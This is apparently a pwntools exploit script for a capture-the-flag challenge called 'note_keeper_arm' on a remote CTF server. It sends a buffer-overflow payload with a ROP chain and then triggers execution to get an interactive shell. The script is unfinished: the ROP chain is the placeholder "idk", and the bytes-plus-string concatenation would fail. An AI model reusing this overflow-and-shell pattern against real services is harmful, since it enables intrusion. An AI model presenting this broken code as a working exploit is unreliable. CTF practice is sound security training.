from pwn import *

# context.arch = "arm"

# p = process("./note_keeper_arm")
# p = process(['qemu-aarch64-static','-L','/usr/aarch64-linux-gnu/','./note_keeper_arm'])
# gdb.attach(p)

# context(os='linux', arch='aarch64')
# context.log_level = 'debug'

p = remote("chal.pctf.competitivecyber.club", 5001)

log.info("Creating first note")
p.recvuntil(b"Quit")
p.sendline(b"1")
p.recvuntil(b"Note ID:")
p.sendline(b"6499") #id
p.recvline(b"[MAX 99 CHARACTERS]")
p.sendline(b"10") #size 
p.recvuntil(b"Message:")
p.sendline(b"A"*4) #input 

ropchain = "idk"

payload = b"B"*100 + ropchain

p.recvuntil(b"Invalid choice")

log.info("Creating note with shellcode")
p.recvuntil(b"Quit")
p.sendline(b"1")
p.recvuntil(b"Note ID:")
p.sendline(b"111155555") #id
p.recvuntil(b"Message:")
p.sendline(payload) #input 

log.info("Ropping")
p.recvuntil(b"Invalid choice")
p.recvuntil(b"Quit")
p.sendline(b"4") # run shellcode

p.interactive()

